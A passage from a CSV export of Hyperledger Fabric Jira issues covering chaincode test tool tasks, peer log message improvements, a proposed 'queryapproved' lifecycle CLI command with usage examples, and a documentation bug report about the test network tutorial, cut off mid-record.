information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The chaincode test tool should test putting, getting and deleting from private data collections",FAB-17392,43984,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:48 AM,21/Jan/20 6:33 PM,28/Oct/23 3:09 AM,21/Jan/20 6:33 PM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,Like the basic tests feature contains tests for managing world state data from a chaincode the chaincode test tool should include a feature following the same checks for private data with the additional focus on ensuring peers do not have private data they shouldn't.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017p7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should have a feature testing the functionality of transaction hooks,FAB-17393,43985,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:50 AM,28/Jan/20 11:40 PM,28/Oct/23 3:09 AM,28/Jan/20 11:40 PM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should define a feature that tests before, after and unknown transaction functions. Checking they are called when required and errors work as expected.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017pf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should test that chaincode produces metadata meeting a defined schema,FAB-17394,43986,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:53 AM,05/Feb/20 11:19 PM,28/Oct/23 3:09 AM,05/Feb/20 11:19 PM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"Currently each fabric implementation aims to meet the same schema although the tests they run use schemas located locally to them and there is no means of ensuring the schemas are in sync. This test would ensure they are.

The test will check the metadata produced matches the schema and perform basic checks. Since the implementations won't perform the exact same output (e.g. Go won't create parameter names) the exact output won't be checked.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017pn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The fabric test tool should provide clear documenation on what is required of chaincode's to be provided to it,FAB-17395,43987,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:56 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The tool requires chaincode to be given to it to run the tests against. There should be clear documentation not only on what the chaincode should do but exactly how it should be structured.

This work will include a schema for each chaincode meeting the metadata schema plus additional information that the metadata schema does not provide e.g. exact values to be returned.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17397,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017pv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should provide a way to check that the provided chaincode meets the schema,FAB-17397,43989,,Task,Backlog,FAB,Fabric,software,denyeart,,,High,,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:59 AM,15/Jan/20 1:21 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"There will be documentation and schemas defining the structure of a chaincode. To help developers using the test tool the tool should check provided chaincode meets the definition schema and provide a clear error.

This should be implemented such that if a chaincode is not being run (due to a user limiting the features/networks run) that chaincode is not checked.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,FAB-17395,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017qb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename CollectionInfo and remove call to GenerateImplicitCollectionForOrg,FAB-17399,43994,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,caod,caod,caod,15/Jan/20 6:14 AM,16/Jan/20 1:12 AM,28/Oct/23 3:09 AM,16/Jan/20 1:12 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"After some discussion with Manish, we decided it would probably make sense to remove the Implicit Collection info from `CollectionInfo` since no consumers use the implicit collection and instead rename the function to ExplicitCollectionInfo.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017rf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jan/20 1:12 AM;caod;After some more investigation it looks like there are still consumers that might expect to pass an implicit collection name (ie BTL policy retrieval). In these cases, removing implicit collections from being returned in CollectionInfo would cause errors. Withdrawing this for now, Manish has mentioned there are existing issues to deal with these interleaved paths that will be addressed once we refactor validation.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve log message for approved definition,FAB-17400,43996,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,15/Jan/20 9:55 AM,20/Jan/20 1:13 PM,28/Oct/23 3:09 AM,20/Jan/20 1:13 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Current *peer lifecycle chaincode approveformyorg* does not seem to output any information of the specified package ID to both the standard output on the console and the peer logs, when the command is executed successfully.

The following is an example of the current peer logs for approved definition.
{code:java}
Successfully approved definition sequence: 1, endorsement info: (version: '1', plugin: 'escc', init required: true), validation info: (plugin: 'vscc', policy: '12202f4368616e6e656c2f4170706c69636174696f6e2f456e646f7273656d656e74'), collections: (), name 'fabcar', on channel 'mychannel'
{code}
 

As a Fabric admin, at least, I want to see the output of the specified package ID for approved definition in the peer logs as follows.
{code:java}
Successfully approved definition sequence: 1, endorsement info: (version: '1', plugin: 'escc', init required: true), validation info: (plugin: 'vscc', policy: '12202f4368616e6e656c2f4170706c69636174696f6e2f456e646f7273656d656e74'), collections: (), name 'fabcar', package ID 'fabcar_1:a6b61184ef66929c1b6e6ad657c248e9ba6283080eb59250a93e1706eeffe981', on channel 'mychannel'
{code}
The log message will be useful for the following scenarios:
 - The message can help Fabric admins to confirm the applied package ID later without recording the command history with the parameters on their console
 - The message can help Fabric admins to quickly notice operation mistakes on the applied package ID especially when environment variables are interpolated in package IDs (e.g., empty package ID)",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,No,Unset,,,,,No,,Unset,No,,,"1|i017rv:",,,,No,Unset,,(Please add steps to reproduce),,No,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add function to query the details of the approved chaincode definition,FAB-17401,43997,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,15/Jan/20 10:31 AM,01/Jul/20 7:43 PM,28/Oct/23 3:09 AM,01/Jul/20 7:26 PM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, Fabric peer CLI does not seem to provide a function to see the details of approved chaincode definitions.

On the other hand, Fabric admins will need to confirm/use the information after approval for their operations.
 For example, the detailed information will be useful to Fabric admins in the following use cases:
 - When confirming/checking the applied parameters after running `approveformyorg` command
 - The admins may miss a record the parameters when executing `approveformyorg`
 - The admins may not notice operation mistakes when executing `approveformyorg` with parameters
 especially when environment variables are interpolated in the parameters (typically for package ID)
 - When considering updating the package ID for the current sequence
 - When giving the approved parameters for the next sequence to other organizations

 

So, we propose to add a function for querying the details of the approved chaincode definition to Fabric peer CLI.

The following shows a basic design of new command.

*Syntax:*
{code:java}
Usage:
  peer lifecycle chaincode queryapproved [flags]

Flags:
  -C, --channelID string               The channel on which this command should be executed
      --connectionProfile string       The fully qualified path to the connection profile that provides the necessary connection information for the network. Note: currently only supported for providing peer connection information
  -h, --help                           help for querycommitted
  -n, --name string                    Name of the chaincode
  -O, --output string                  The output format for query results. Default is human-readable plain-text. json is currently the only supported format.
      --peerAddresses stringArray      The addresses of the peers to connect to
      --sequence int                   The sequence number of the chaincode definition for the channel
      --tlsRootCertFiles stringArray   If TLS is enabled, the paths to the TLS root cert files of the peers to connect to. The order and number of certs specified should match the --peerAddresses flag
{code}
 

*Example of usage:* 
 *Case-1: Running with a sequence number (specified)*
{code:java}
$ peer lifecycle chaincode queryapproved --channelID mychannel –chaincode mycc –sequence 1 -o orderer.example.com:7050 --tls --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051

Approved chaincode definition for chaincode 'mycc' on channel 'mychannel':
sequence: 1, version: 1, init-required: true, package-id: myccv1:a7ca45a7cc85f1d89c905b775920361ed089a364e12a9b6d55ba75c965ddd6a9, endorsement-plugin: escc, validation-plugin: vscc (omitted)
{code}
 

*Case-2: Running without a sequence number*

If the parameter of sequence is not provided, this command returns the latest approved chaincode definition　(latest: new one of the currently defined sequence number and the next sequence number).
{code:java}
$ peer lifecycle chaincode queryapproved --channelID mychannel –chaincode mycc -o orderer.example.com:7050 --tls --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051

Approved chaincode definition for chaincode 'mycc' on channel 'mychannel':
sequence: 2, version: 2, init-required: false, package-id: myccv2:a7ca45a7cc85f1d89c905b775920361ed089a364e12a9b6d55ba75c965ddd6a0, endorsement-plugin: escc, validation-plugin: vscc (omitted)
{code}
 

*Case-3: Running with the JSON output format for query results*
{code:java}
$ peer lifecycle chaincode queryapproved --channelID mychannel –chaincode mycc –sequence 1 -o orderer.example.com:7050 --tls --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051 --output json
{
        ""sequence"": 1,
        ""version"": ""1"",
        ""endorsement_plugin"": ""escc"",
        ""validation_plugin"": ""vscc"",
        ""validation_parameter"": ""EiAvQ2hhbm5lbC9BcHBsaWNhdGlvbi9FbmRvcnNlbWVudA=="",
        ""collections"": {},
        ""init_required"": true,
        ""package_id"": ""myccv2:a7ca45a7cc85f1d89c905b775920361ed089a364e12a9b6d55ba75c965ddd6a0""
}
{code}
 ",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17406,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i017s3:",,,,Yes,Unset,,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Jul/20 7:43 PM;denyeart;Thank you for the nice new feature in v2.2 [~tatsu-sato] !;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test network error,FAB-17402,44002,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,pandrejko,pandrejko,16/Jan/20 12:57 AM,20/Jan/20 1:03 PM,28/Oct/23 3:09 AM,20/Jan/20 1:03 PM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"From here: https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html

This:

Because the endorsement policy for the fabcar chaincode requires the transaction to be signed by Org1 and Org2, any chaincode invoke using the peer binaries needs to target both peer0.org1.example.com and peer0.org1.example.com. You can pass the following values to your invoke commands to target both peers:



should reflect peer0.org1.example.com and peer0.org2.example.com

Also FWIW -- the embedded values referenced below the above text is CONFUSING. While the concept is correct and the snippet ---peerAddresses is in-fact contained in the command the user used in the previous step, if the user passes the snippet while ""following along with the tutorial"", it throws an error as it's not a valid command.

